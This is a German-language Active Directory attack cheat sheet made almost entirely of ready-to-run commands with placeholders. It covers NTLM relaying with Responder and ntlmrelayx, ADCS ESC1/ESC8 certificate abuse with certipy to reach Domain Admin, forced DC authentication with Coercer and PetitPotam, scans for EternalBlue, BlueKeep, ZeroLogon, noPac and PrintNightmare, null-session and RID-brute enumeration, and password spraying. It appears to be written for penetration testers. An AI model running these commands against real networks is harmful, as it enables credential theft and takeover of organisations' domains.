# Boris S1 Quick Wins

#plateform/linux #target/remote #cat/QUICK-WIN

% boris, stage1, quickwins, relay, ntlm, signing, nxc, targets
## [S1.1a] nxc - Relay-Target-Liste (Hosts ohne SMB Signing)
```
nxc smb <target_range> --gen-relay-list <relay_file|smb_targets.txt>
```

% boris, stage1, quickwins, relay, responder, poisoning, llmnr, nbtns
## [S1.1b] Responder - SMB+HTTP OFF, dann Analyse/Poisoning starten
```
sudo sed -i.bak 's/^SMB = On/SMB = Off/I; s/^HTTP = On/HTTP = Off/I' /etc/responder/Responder.conf && sudo responder -I <interface> -Pv
```

% boris, stage1, quickwins, relay, ntlmrelayx, socks, impacket, hashes
## [S1.1c] ntlmrelayx - Relay starten (socks + Hashes dumpen)
```
ulimit -n 10000; impacket-ntlmrelayx -tf <relay_file|smb_targets.txt> -smb2support -socks --output-file <output_file|ntlm_hashes.txt>
```

% boris, stage1, quickwins, relay, socks, proxychains, nxc, session
## [S1.1d] SOCKS nutzen - relayte Session ueber proxychains (nxc)
```
proxychains -q nxc smb <target_range> -u <user> -p '' -d <domain> --shares
```

% boris, stage1, quickwins, adcs, certipy, recon, esc, esc8, vulnerable
## [S1.2a] certipy - ADCS Recon (vulnerable Templates, ESC1-ESC11)
```
certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout
```

% boris, stage1, quickwins, adcs, certipy, bloodhound, esc1, analyse
## [S1.2b] certipy - Find fuer BloodHound (ESC1-Analyse, Ly4k Queries)
```
certipy find -u <user>@<domain> -p <password> -target <dc_fqdn> -old-bloodhound
```

% boris, stage1, quickwins, adcs, bloodhound, collector, dump, esc1
## [S1.2c] bloodhound-python - Dump (Users/Computer fuer ESC1)
```
bloodhound-python -u <user> -p <password> -d <domain> -c all -dc <dc_fqdn> -ns <dc_ip> --zip
```

% boris, stage1, quickwins, adcs, certipy, esc1, san, req, upn
## [S1.2d] certipy - ESC1 Cert anfordern (SAN/UPN = Administrator)
```
certipy req -u <user>@<domain> -p <password> -ca <ca_name> -target <ca_fqdn> -template <template|ESC1> -upn administrator@<domain>
```

% boris, stage1, quickwins, adcs, certipy, esc8, relay, kerberosauthentication, web
## [S1.2e] certipy - ESC8 Relay auf CA Web-Enrollment (KerberosAuthentication)
```
certipy relay -target 'http://<ca_fqdn>' -template <template|KerberosAuthentication> -debug
```

% boris, stage1, quickwins, coerce, coercer, petitpotam, dc, esc8
## [S1.2f] Coercer - DC zur Authentifizierung zwingen (fuer ESC8/Relay)
```
python3 Coercer.py coerce -l <lhost> -t <dc_ip> -u <user> -p <password> -d <domain>
```

% boris, stage1, quickwins, adcs, certipy, auth, pfx, tgt, hash, pth
## [S1.2g] certipy - Auth mit .pfx -> TGT + NT-Hash (Domain Admin)
```
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```

% boris, stage1, quickwins, vuln, eternalblue, ms17-010, smb, nmap, cve-2017-0144
## [S1.3a] EternalBlue MS17-010 (nmap)
```
nmap -Pn -p445 --open --script smb-vuln-ms17-010 <target_range> -oN nmap_ms17-010.txt
```

% boris, stage1, quickwins, vuln, bluekeep, rdp, cve-2019-0708, metasploit
## [S1.3b] BlueKeep CVE-2019-0708 (msf Scanner)
```
msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS <target_range>; set THREADS 50; run; exit"
```

% boris, stage1, quickwins, vuln, zerologon, cve-2020-1472, dc, nxc
## [S1.3c] ZeroLogon CVE-2020-1472 (nxc)
```
nxc smb <dc_ip> -u '' -p '' -M zerologon
```

% boris, stage1, quickwins, vuln, nopac, samaccountname, cve-2021-42278, nxc
## [S1.3d] noPac CVE-2021-42278/42287 (nxc)
```
nxc smb <dc_ip> -u <user> -p <password> -M nopac
```

% boris, stage1, quickwins, vuln, petitpotam, coerce, cve-2021-36942
## [S1.3e] PetitPotam - unauth Coercion Check
```
python3 PetitPotam.py -d <domain> <lhost> <dc_ip>
```

% boris, stage1, quickwins, vuln, printnightmare, spooler, cve-2021-1675, nxc
## [S1.3f] PrintNightmare / Spooler Check (nxc)
```
nxc smb <target_range> -u <user> -p <password> -M spooler
```

% boris, stage1, quickwins, enum, smb, nullsession, shares, passpol, nxc
## [S1.4a] nxc - Null-Session Enum (shares / users / pass-pol)
```
nxc smb <dc_ip> -u '' -p '' --shares --users --pass-pol
```

% boris, stage1, quickwins, enum, ridbrute, users, nxc
## [S1.4b] nxc - RID Brute (User-Enum ohne Creds)
```
nxc smb <dc_ip> -u '' -p '' --rid-brute 5000
```

% boris, stage1, quickwins, enum, spray, useraspassword, nxc
## [S1.4c] nxc - Username = Password Spray
```
nxc smb <target_range> -u <users_file|users.txt> -p <users_file|users.txt> --no-bruteforce --continue-on-success
```
